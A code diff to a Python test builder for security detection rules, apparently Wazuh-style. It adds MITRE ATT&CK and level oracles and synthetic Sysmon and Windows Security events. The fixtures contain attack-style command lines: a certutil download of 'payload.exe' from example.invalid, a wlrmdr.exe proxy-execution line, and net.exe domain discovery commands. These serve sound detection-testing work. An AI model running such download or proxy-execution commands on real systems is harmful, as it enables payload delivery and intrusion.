@@ -127,8 +127,11 @@ def eventlog_cleared(event_id):
     }}
 
 
-SYSMON_RULES = {"100100", "100101", "100500", "100501", "100550", "100552", "100600",
-                "100601", "100602", "100603", "100700", "100710", "100720"}
+SYSMON_RULES = {
+    "100100", "100101", "100500", "100501", "100550", "100552",
+    "100600", "100601", "100602", "100603", "100604", "100605", "100606",
+    "100700", "100710", "100720",
+}
 SEC4688_RULES = {"100701", "100711", "100721", "100722"}
 
 SURICATA_LINE = (
@@ -149,14 +152,54 @@ FILTERLOG_PASS = FILTERLOG_BLOCK.replace(",block,", ",pass,")
 FILTERLOG_EXTERNAL = FILTERLOG_BLOCK.replace("10.10.30.149", "203.0.113.7")
 
 
-def build_cases():
-    """Return the engine cases built from the field samples in cases.py plus extra ones.
+# Exact oracles for every positive synthetic engine case. Empty MITRE arrays are
+# intentional for parent/telemetry rules that do not declare a technique.
+POSITIVE_ORACLES = {
+    "100100": (6, ["T1082"]),
+    "100101": (8, ["T1082", "T1036.003"]),
+    "100200": (6, []),
+    "100300": (3, []),
+    "100301": (7, ["T1046"]),
+    "100400": (10, ["T1136.002"]),
+    "100450": (8, ["T1136.001"]),
+    "100500": (8, ["T1053.005"]),
+    "100501": (8, ["T1053.005", "T1036.003"]),
+    "100550": (8, ["T1070.001"]),
+    "100551": (8, ["T1070.001"]),
+    "100552": (8, ["T1070.001", "T1036.003"]),
+    "100600": (6, ["T1087.001"]),
+    "100601": (6, ["T1069.001"]),
+    "100602": (6, ["T1555.004"]),
+    "100603": (6, ["T1033"]),
+    "100604": (6, ["T1087.002"]),
+    "100605": (6, ["T1069.002"]),
+    "100606": (6, ["T1201"]),
+    "100700": (8, ["T1105"]),
+    "100701": (8, ["T1105"]),
+    "100710": (6, ["T1021.002"]),
+    "100711": (6, ["T1021.002"]),
+    "100720": (8, ["T1202"]),
+    "100721": (8, ["T1202"]),
+    "100722": (8, ["T1202"]),
+}
 
-    Each case: dict(name, rule, kind, events, log_format, expect) where expect is either
-    {"rule_id": "..."} (the last event must fire exactly this rule) or {"not_rule_id": "..."}.
-    """
+
+def positive_expect(rule_id):
+    try:
+        level, mitre = POSITIVE_ORACLES[rule_id]
+    except KeyError as exc:
+        raise ValueError(f"positive case has no level/MITRE oracle for rule {rule_id}") from exc
+    return {"rule_id": rule_id, "level": level, "mitre": list(mitre)}
+
+
+def build_cases():
+    """Return complete synthetic positive/negative engine cases with exact oracles."""
     cases = []
     for index, (rule_id, fields, positive) in enumerate(CASES):
+        # 100400 is a frequency rule; its complete event sequences are added below.
+        # The lightweight pattern samples in cases.py only cover its field scope.
+        if rule_id == "100400":
+            continue
         if rule_id in SYSMON_RULES:
             event = sysmon_event1(fields)
         elif rule_id in SEC4688_RULES:
@@ -167,7 +210,7 @@ def build_cases():
             line = SURICATA_LINE if positive else SURICATA_NON_SCAN
             cases.append(dict(name=f"{rule_id} {'positive' if positive else 'negative'} #{index}",
                               rule=rule_id, kind="synthetic", events=[line], log_format="syslog",
-                              expect=({"rule_id": rule_id} if positive else {"not_rule_id": rule_id})))
+                              expect=(positive_expect(rule_id) if positive else {"not_rule_id": rule_id})))
             continue
         else:
             raise SystemExit(f"no engine template for rule {rule_id}")
@@ -175,30 +218,120 @@ def build_cases():
             name=f"{rule_id} {'positive' if positive else 'negative'} #{index}",
             rule=rule_id, kind="synthetic", events=[json.dumps(event, separators=(",", ":"))],
             log_format="syslog",
-            expect=({"rule_id": rule_id} if positive else {"not_rule_id": rule_id})))
+            expect=(positive_expect(rule_id) if positive else {"not_rule_id": rule_id})))
 
     def add(name, rule, events, expect, log_format="syslog"):
         cases.append(dict(name=name, rule=rule, kind="synthetic", events=events,
                           log_format=log_format, expect=expect))
 
-    dump = lambda e: json.dumps(e, separators=(",", ":"))  # noqa: E731
+    dump = lambda event: json.dumps(event, separators=(",", ":"))  # noqa: E731
 
-    # Rules that the field samples cannot cover: decoders, frequency, parent only rules.
-    add("100300 parent alert (any Suricata alert)", "100300", [SURICATA_NON_SCAN], {"rule_id": "100300"})
+    # Parent and decoder behavior that field-pattern samples cannot verify.
+    add("100300 parent alert (any Suricata alert)", "100300", [SURICATA_NON_SCAN], positive_expect("100300"))
     add("100300 negative, not an alert event", "100300", [SURICATA_STATS], {"not_rule_id": "100300"})
-    add("100200 firewall block between lab segments", "100200", [FILTERLOG_BLOCK], {"rule_id": "100200"})
+    add("100200 firewall block between lab segments", "100200", [FILTERLOG_BLOCK], positive_expect("100200"))
     add("100200 negative, traffic that was passed", "100200", [FILTERLOG_PASS], {"not_rule_id": "100200"})
     add("100200 negative, source outside the lab range", "100200", [FILTERLOG_EXTERNAL], {"not_rule_id": "100200"})
-    add("100551 Security 1102 audit log cleared", "100551", [dump(eventlog_cleared("1102"))], {"rule_id": "100551"})
-    add("100551 System 104 log file cleared", "100551", [dump(eventlog_cleared("104"))], {"rule_id": "100551"})
+    add("100551 Security 1102 audit log cleared", "100551", [dump(eventlog_cleared("1102"))], positive_expect("100551"))
+    add("100551 System 104 log file cleared", "100551", [dump(eventlog_cleared("104"))], positive_expect("100551"))
 
-    # Frequency rule 100400: the tenth account creation inside one session fires it, the ninth does not.
-    def account(name):
-        return dump(security_4720({"win.eventdata.targetUserName": name,
-                                   "win.eventdata.targetDomainName": "CORP",
-                                   "win.eventdata.samAccountName": name}))
-    nine = [account(f"zz.test{i}") for i in range(1, 10)]
-    add("100400 boundary, 9 accounts stay below the threshold", "100400", nine, {"not_rule_id": "100400"})
-    add("100400 boundary, the 10th account fires", "100400", nine + [account("zz.test10")],
-        {"rule_id": "100400"})
+    # Direct binary identity positives and wrapper-only negatives.
+    certutil = sysmon_event1({
+        "win.eventdata.image": r"C:\\Windows\\System32\\certutil.exe",
+        "win.eventdata.originalFileName": "CertUtil.exe",
+        "win.eventdata.commandLine": r"certutil.exe -urlcache -split -f https://example.invalid/payload.exe C:\\Temp\\payload.exe",
+    })
+    add("100700 positive, certutil image with urlcache arguments", "100700",
+        [dump(certutil)], positive_expect("100700"))
+    benign_echo = sysmon_event1({
+        "win.eventdata.image": r"C:\\Windows\\System32\\cmd.exe",
+        "win.eventdata.originalFileName": "Cmd.Exe",
+        "win.eventdata.commandLine": r"cmd.exe /c echo certutil -urlcache -split -f probe-002",
+    })
+    add("100700 negative, captured benign certutil echo", "100700",
+        [dump(benign_echo)], {"not_rule_id": "100700"})
+    mismatch_original_name = sysmon_event1({
+        "win.eventdata.image": r"C:\\Windows\\System32\\cmd.exe",
+        "win.eventdata.originalFileName": "Cmd.Exe",
+        "win.eventdata.commandLine": r"cmd.exe /c certutil.exe -urlcache -split -f https://example.invalid/file",
+    })
+    add("100700 negative, certutil arguments under cmd.exe image", "100700",
+        [dump(mismatch_original_name)], {"not_rule_id": "100700"})
+
+    # PowerShell cmdlet equivalents are deliberately outside the net.exe detections.
+    for cmdlet, target_rule in (("Get-LocalUser", "100600"), ("Get-ADUser", "100600"),
+                                ("Get-LocalGroup", "100601"), ("Get-ADGroup", "100601")):
+        ps_event = sysmon_event1({
+            "win.eventdata.image": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "win.eventdata.originalFileName": "PowerShell.EXE",
+            "win.eventdata.commandLine": f"powershell.exe -NoProfile -Command {cmdlet}",
+        })
+        add(f"{target_rule} negative, PowerShell cmdlet {cmdlet}", target_rule,
+            [dump(ps_event)], {"not_rule_id": target_rule})
+
+    # The shell wrapper contains Wlrmdr text, but its image/newProcessName is PowerShell.
+    wlr_wrapper_sysmon = sysmon_event1({
+        "win.eventdata.image": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "win.eventdata.originalFileName": "PowerShell.EXE",
+        "win.eventdata.commandLine": r'"powershell.exe" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u "C:\\Windows\\System32\\calc.exe"}',
+    })
+    add("100720 negative, Wlrmdr text in a PowerShell command line", "100720",
+        [dump(wlr_wrapper_sysmon)], {"not_rule_id": "100720"})
+
+    # The domain path is explicitly DC01 + Security 4720 + CORP; local creation
+    # events and a local target domain remain outside the burst rule.
+    def account(name, computer="DC01.corp.lab", target_domain="CORP", actor="Administrator"):
+        return dump(security_4720({
+            "win.system.computer": computer,
+            "win.system.channel": "Security",
+            "win.eventdata.targetUserName": name,
+            "win.eventdata.targetDomainName": target_domain,
+            "win.eventdata.samAccountName": name,
+            "win.eventdata.subjectUserName": actor,
+        }))
+
+    domain_nine = [account(f"zz.domain{i}") for i in range(1, 10)]
+    add("100400 boundary, 9 DC domain accounts stay below threshold", "100400",
+        domain_nine, {"not_rule_id": "100400"})
+    add("100400 boundary, 10 DC domain accounts fire", "100400",
+        domain_nine + [account("zz.domain10")], positive_expect("100400"))
+    add("100400 negative, local accounts on WS01 do not form a domain burst", "100400",
+        [account(f"zz.local{i}", computer="WS01.corp.lab", target_domain="WS01")
+         for i in range(1, 11)], {"not_rule_id": "100400"})
+    add("100400 negative, local target domain on DC01 is not a domain burst", "100400",
+        [account(f"zz.wrongdomain{i}", target_domain="WS01") for i in range(1, 11)],
+        {"not_rule_id": "100400"})
+
+    # The account/group split and policy discovery have separate ATT&CK oracles.
+    for rule, command, technique in (
+        ("100604", "net.exe user /domain", "T1087.002"),
+        ("100605", "net.exe group /domain", "T1069.002"),
+        ("100606", "net.exe accounts", "T1201"),
+    ):
+        event = sysmon_event1({
+            "win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+            "win.eventdata.originalFileName": "net.exe",
+            "win.eventdata.commandLine": command,
+        })
+        add(f"{rule} positive, {command}", rule, [dump(event)],
+            {"rule_id": rule, "level": 6, "mitre": [technique]})
+
+    # Only Windows administrative shares should satisfy 100710.
+    public_share = sysmon_event1({
+        "win.eventdata.commandLine": r"copy a.txt \\fileserver\public\a.txt",
+    })
+    add("100710 negative, ordinary public share", "100710",
+        [dump(public_share)], {"not_rule_id": "100710"})
+    public_share_4688 = security_4688({
+        "win.eventdata.commandLine": r"copy a.txt \\fileserver\public\a.txt",
+    })
+    add("100711 negative, ordinary public share", "100711",
+        [dump(public_share_4688)], {"not_rule_id": "100711"})
+
+    # Assert that no new positive case is added without a complete oracle.
+    for case in cases:
+        expectation = case["expect"]
+        if "rule_id" in expectation and case["kind"] == "synthetic":
+            if "level" not in expectation or "mitre" not in expectation:
+                raise ValueError(f"positive synthetic case lacks exact level/MITRE: {case['name']}")
     return cases
